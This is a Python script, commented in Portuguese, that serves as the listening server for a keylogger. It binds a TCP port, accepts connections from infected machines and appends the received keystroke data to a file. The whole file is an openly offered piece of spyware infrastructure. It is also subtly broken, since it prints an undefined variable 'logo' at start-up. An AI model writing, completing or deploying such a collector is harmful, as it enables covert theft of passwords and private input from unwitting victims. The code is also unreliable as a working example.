#!/usr/bin/python3

##Author : AndreyQuerino
##Descr  : Servidor Keylogger para ouvir os pacotes recebidos

import socket
import threading
import argparse
import signal, subprocess, sys

parser = argparse.ArgumentParser()
parser.add_argument("-l", help="Enter the Localhost IP", required=True)
parser.add_argument("-p", type=int, help="Enter the port number to listen to", required=True)
parser.add_argument("-o", help="The output file to write data to", required=True)
args = parser.parse_args()
subprocess.call('clear', shell=True)
print(logo)

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)	#Relese binded socket on exit
server.bind((args.l, args.p))
server.listen(5)	#Maximum 5 connections allowed

print("[+] Listening on %s:%d" % (args.l, args.p))


def signal_handler(signal, frame):
	quitTask = str(input("\n\033[1;31;40m[!] Are you sure you want to quit? [y/n]\n>>> \033[0;37;40m"))
	if quitTask == "y":
		sys.exit(0)
	else:
		print("\n[+] Continuing to listen on %s:%d" % (args.l, args.p))
		pass


def handle_client(client_socket):
	request = client_socket.recv(1024)
	print("\033[1;32;40m[+] Writing Data to file:\033[1;37;40m %s" % args.o)
	print("\033[1;32;40m[+] Recieved Data:\033[1;37;40m %s\033[0;37;40m" % str(request.decode("utf-8")))
	target_file = open(args.o, 'a+')
	target_file.write(str(request.decode("utf-8")))
	target_file.close()
	client_socket.close()

def main():
	while True:
		signal.signal(signal.SIGINT, signal_handler)
		print("[-] Print Ctrl+C to stop the Server")
		client, addr = server.accept()
		print("[+] Accepted connection from: %s:%d" % (addr[0], addr[1]))
		client_handler = threading.Thread(target=handle_client,args=(client, ))
		client_handler.start()

if __name__ == "__main__":
	main()
